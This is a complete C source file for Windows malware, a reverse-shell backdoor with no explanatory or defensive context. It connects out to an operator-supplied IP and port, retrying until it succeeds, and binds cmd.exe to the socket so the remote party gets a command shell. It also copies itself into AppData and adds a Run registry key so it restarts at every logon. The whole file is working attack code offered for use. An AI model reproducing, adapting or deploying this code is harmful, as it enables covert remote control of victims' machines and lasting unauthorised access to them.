#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <shlobj.h>

#pragma comment(lib, "ws2_32")

void set_persistence() {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    char appDataPath[MAX_PATH];
    char destPath[MAX_PATH];
    
    SHGetSpecialFolderPath(NULL, appDataPath, CSIDL_APPDATA, FALSE);

    snprintf(destPath, MAX_PATH, "%s\\%s", appDataPath, "program.exe");

    if (CopyFile(path, destPath, FALSE)) {
        HKEY hKey;
        LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
        if (result == ERROR_SUCCESS) {
            RegSetValueEx(hKey, "PersistenceProgram", 0, REG_SZ, (BYTE *)destPath, strlen(destPath) + 1);
            RegCloseKey(hKey);
        }
    }
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("YOUR IP");
    server.sin_port = htons(YOUR PORT);

    while (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        Sleep(5000);
    }

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)sock;

    char currentDirectory[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, currentDirectory);
    SetCurrentDirectory("C:");

    char *command = "cmd.exe";
    CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

    SetCurrentDirectory(currentDirectory);

    set_persistence();

    return 0;
}
